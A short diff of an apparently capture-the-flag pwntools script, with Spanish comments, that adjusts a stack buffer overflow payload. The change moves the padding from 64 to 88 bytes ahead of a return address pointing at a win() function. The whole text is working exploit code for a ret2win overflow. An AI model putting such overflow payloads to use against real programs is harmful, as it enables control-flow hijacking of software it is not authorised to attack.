@@ -16,7 +16,8 @@ else:
         print("Calmbia Local a True o False")
 
 # Creación del payload
-payload = b'A' * 64 + p64(0x00401090)  # Dirección de la función win() (esto debe ser la dirección correcta en tu binario)
+payload = b'A' * 88 
+payload += p64(0x00401090)  # Dirección de la función win() (esto debe ser la dirección correcta en tu binario)
 
 # Enviar el payload cuando se recibe el mensaje de "Introduce tu mensaje:"
 p.sendlineafter(b"Introduce tu mensaje:", payload)
